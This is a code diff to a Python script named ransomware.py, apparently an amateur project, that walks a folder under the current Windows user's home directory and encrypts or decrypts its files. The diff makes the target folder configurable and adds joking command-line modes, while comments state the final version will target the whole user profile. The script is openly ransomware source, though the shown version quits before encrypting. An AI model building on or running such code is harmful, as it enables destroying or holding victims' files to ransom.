@@ -38,7 +38,7 @@ def generateKey():
 
 def encryptFiles(key):
     #Will set the path in os.walk to be C:\Users\{user} in the final version of the script
-    for root, dirs, files in os.walk("C:\\Users\\{user}\\encrypt_test".format(user=os.getlogin())):
+    for root, dirs, files in os.walk("C:\\Users\\{user}\\{path}".format(path=path, user=os.getlogin())):
         for file in files:
             if(not (file == "key.key" or file == "ransomware.py" or ".encrypted" in file)):
                 print(file)
@@ -64,7 +64,7 @@ def encryptFile(filePath, key):
 def decryptFiles(key):
     decryptedFile = False
     #Will set the path in os.walk to be C:\Users\{user} in the final version of the script
-    for root, dirs, files in os.walk("C:\\Users\\{user}\\encrypt_test".format(user=os.getlogin())):
+    for root, dirs, files in os.walk("C:\\Users\\{user}\\{path}".format(path=path, user=os.getlogin())):
         for file in files:
             print(file)
             decryptedFile = decryptFile(root + "\\" + file, key) or decryptedFile
@@ -94,8 +94,17 @@ def decryptFile(filePath, key):
             return False
     except Exception as e:
         return False
-    
-print(sys.argv[0])
+
+path="encrypt_test"
+
+if (len(sys.argv) == 1):
+    print("Not so fast, dumbass. Try an argument too.")
+    quit()
+if (sys.argv[1] == "pretend"):
+    print("Oooh. Ooh yeah. I'm- I'm encryptin' real hard here. Ooh. I'm gonna morb")
+    quit()
+elif (sys.argv[1] == "practice"):
+    path="encrypt_test"
 quit()
 key = generateKey()
 encryptFiles(key)
